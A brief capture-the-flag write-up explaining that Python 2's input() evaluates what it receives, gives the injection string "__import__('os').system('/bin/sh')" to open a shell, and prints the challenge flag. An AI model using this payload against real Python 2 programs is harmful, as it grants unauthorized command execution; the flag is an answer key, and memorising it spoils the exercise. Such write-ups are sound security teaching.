Vulnerability: https://blog.efiens.com/efiensctf2019-round2-write-ups/
Python 2's input() actually evaluates the input instead of taking it as a string.
Input "__import__('os').system('/bin/sh')" which opens shell

Flag: TIMCTF{h1ss_h1ss_shell}
